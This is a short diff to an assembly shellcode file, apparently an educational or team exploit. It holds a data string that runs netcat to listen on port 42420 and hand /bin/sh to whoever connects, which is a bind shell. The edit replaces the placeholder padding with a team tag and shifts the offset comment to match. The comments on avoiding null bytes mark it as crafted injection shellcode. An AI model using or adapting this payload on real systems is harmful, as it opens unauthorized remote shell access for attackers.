@@ -37,6 +37,6 @@ Shellcode:
 
 End:
   call Shellcode                                          ; goto Shellcode label
-  db '/bin/nc0-lp42420-e/bin/sh0AAAABBBBCCCCDDDD'         ; avoid (ro)data section. Can't zero data here (avoid null bytes in payload)
-  ;   0123456789012345678901234567890123456789012         ; esi offset scale
+  db '/bin/nc0-lp42420-e/bin/sh0CA647_ELITE_TEAM'         ; avoid (ro)data section. Can't zero data here (avoid null bytes in payload)
+  ;   012345678901234567890123456789012345678901         ; esi offset scale
   ;   0         1         2         3         4
